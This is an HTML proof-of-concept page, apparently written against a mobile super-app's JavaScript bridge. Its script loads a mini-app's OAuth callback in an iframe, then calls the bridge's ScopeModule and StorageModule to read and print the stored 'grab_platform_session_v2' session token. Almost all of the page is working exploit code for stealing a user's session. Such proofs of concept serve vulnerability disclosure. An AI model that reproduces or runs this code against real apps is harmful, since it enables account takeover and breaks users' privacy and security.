<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PoC</title>
<style>body{font:13px monospace;background:#000;color:#0f0;padding:10px}pre{white-space:pre-wrap;word-break:break-all}button{font:inherit;background:#222;color:#0f0;border:1px solid #0f0;padding:8px 16px;margin:4px;cursor:pointer}iframe{width:100%;height:400px;border:1px solid #333}</style>
</head>
<body>
<button onclick="run()">RUN</button>
<pre id="o"></pre>
<iframe id="f" style="display:none"></iframe>
<script>
var S={};function sub(f){var d=!1;return{isUnsubscribed:()=>d,unsubscribe:()=>{if(!d){f();d=!0}}}}
function stream(s){return{subscribe:s,then:(ok,fail)=>new Promise((res,rej)=>{try{var h=null,done=!1;h=s({next:v=>{res(ok?ok(v):v);h&&h.unsubscribe();done=!0}});done&&h&&h.unsubscribe()}catch(e){fail==null?rej(e):res(fail(e))}})}}
function cn(c,m,f){var id=0;return()=>{var n="";while((n=m+"_"+f+"Callback_"+id)in c)id++;id++;return n}}
function wc(c,o){return stream(obs=>{var s,nm=o.cf();c[nm]=r=>{var res=r.result===null?void 0:r.result;var err=r.error===null?void 0:r.error;obs&&obs.next&&obs.next({result:res,error:err,status_code:r.status_code})};o.w(nm);s=sub(()=>{c[nm]=void 0});return s})}
function wrap(m){if(!window["Wrapped"+m]){window["Wrapped"+m]=(function(c,n,call){return{invoke:(met,par)=>wc(c,{cf:cn(c,n,met),w:cb=>call({callback:cb,method:met,module:n,parameters:par||{}})})}})(window,m,msg=>{if(window[m]&&window[m][msg.method]instanceof Function)window[m][msg.method](JSON.stringify(msg));else if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers[m])window.webkit.messageHandlers[m].postMessage(msg);else throw Error("No bridge:"+m)})}}
function inv(m,met,p){wrap(m);return window["Wrapped"+m].invoke(met,p||{})}

var o=document.getElementById("o");
function log(s){o.textContent+=s+"\n"}

async function run(){
o.textContent="";

log("[1] iframe → fantacore.io/auth/grab/callback");
var f=document.getElementById("f");
f.style.display="block";
f.src="https://grab.fantacore.io/auth/grab/callback?client_id=3c0a913283904301b4011998f705ad00";

log("[2] wait 5s for PlaysOut JS to write session...");
await new Promise(r=>setTimeout(r,5000));

log("[3] ScopeModule.reloadScopes()");
try{var s=await inv("ScopeModule","reloadScopes");log("    → "+s.status_code)}catch(e){log("    → "+e.message)}

log("[4] StorageModule.getString('grab_platform_session_v2')");
try{
  var r=await inv("StorageModule","getString",{key:"grab_platform_session_v2"});
  log("    → status: "+r.status_code);
  if(r.status_code===200&&r.result){
    log("\n=== SESSION ===");
    try{var p=JSON.parse(r.result);log(JSON.stringify(p,null,2))}
    catch(e){log(r.result)}
  }else{log("    → empty")}
}catch(e){log("    → "+e.message)}

log("\n[5] ScopeModule.reloadScopes() (cleanup)");
try{var s2=await inv("ScopeModule","reloadScopes");log("    → "+s2.status_code)}catch(e){log("    → "+e.message)}

log("\nDONE");
}
</script>
</body>
</html>
